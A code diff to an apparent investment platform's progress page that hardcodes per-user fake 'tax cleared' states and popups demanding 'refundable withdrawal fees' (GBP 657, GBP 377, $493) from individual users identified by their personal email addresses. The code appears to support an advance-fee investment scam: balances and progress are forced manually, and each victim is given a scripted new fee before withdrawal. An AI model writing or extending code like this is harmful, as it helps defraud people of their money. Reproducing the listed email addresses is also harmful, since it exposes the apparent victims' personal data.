@@ -373,8 +373,8 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     currentValue: 5000,
     taxRate: 0.165,
     taxDue: 825,
-    taxRemaining: 825,
-    taxPaid: 0,
+    taxRemaining: 0,
+    taxPaid: 825,
     initialHoldings: 500,
     currency: "GBP",
     forceProgressPct: 100,
@@ -412,6 +412,9 @@ const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
     "Tax cleared successfully. A withdrawal fee of GBP 500.00 is required to continue with withdrawal.",
   "ajamibilal@yahoo.com":
     "Tax cleared successfully. Congratulations. To proceed with withdrawal, please clear the withdrawal fee of $493.00."
+  ,
+  "josiahbauman03@gmail.com":
+    "Congratulations for clearing tax. A refundable withdrawal fee of GBP 657.00 is required to process your withdrawal. Please clear this refundable fee to proceed."
 };
 const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["samlebrun01@gmail.com", "tzahielk@gmail.com"]);
 const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<
@@ -1746,6 +1749,13 @@ export default function ProgressPage() {
         await new Promise((resolve) => window.setTimeout(resolve, 1200));
         setTaxPopup(
           "Congratulations. Your tax payment has been cleared successfully. To complete your withdrawal process, a refundable withdrawal fee of GBP 377.00 is now required. Please proceed to clear this refundable fee."
+        );
+        return;
+      }
+      if (userEmailLower === "josiahbauman03@gmail.com") {
+        await new Promise((resolve) => window.setTimeout(resolve, 1200));
+        setTaxPopup(
+          "Congratulations for clearing tax. A refundable withdrawal fee of GBP 657.00 is required to process your withdrawal. Please clear this refundable fee to proceed."
         );
         return;
       }
